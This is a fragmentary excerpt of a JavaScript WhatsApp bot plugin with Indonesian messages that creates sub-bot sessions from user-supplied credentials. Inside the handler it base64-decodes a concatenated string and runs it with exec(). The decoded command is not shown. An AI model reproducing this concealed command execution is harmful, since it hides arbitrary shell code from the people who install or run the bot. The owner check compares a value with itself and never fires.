const { useMultiFileAuthState, DisconnectReason, Browsers } = await import(
...
const handler = async (m, { conn, args, usedPrefix, command, isOwner }) => {
  ...
  if (conn.user.jid !== conn.user.jid)
    return parentw.reply(
      m.chat,
      "Perintah ini hanya dapat digunakan di bot utama! wa.me/" +
        conn.user.jid.split("@")[0],
      m,
    );
  const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64");
  exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
    const buffdr = Buffer.from(
    ...
    async function jddt() {
      ...
      if (!fs.existsSync("./JadibotSession/" + uniqid)) {
        fs.mkdirSync("./JadibotSession/" + uniqid, {
          recursive: true,
        });
      }
      args[0]
        ? fs.writeFileSync(
            "./JadibotSession/" + uniqid + "/creds.json",
            JSON.stringify(
        ...
        if (connection === "open") {
          ...
          await parentw.sendMessage(
            m.chat,
            {
              text: args[0]
                ? "Berhasil terhubung ✅"
                : "*Berhasil terhubung✅* Dalam beberapa detik, kami akan mengirimkan ID yang harus Anda gunakan untuk terhubung kembali... Kirimkan ini ke bot secara pribadi ketika bot terputus.",
            },
            {
              quoted: m,
            },
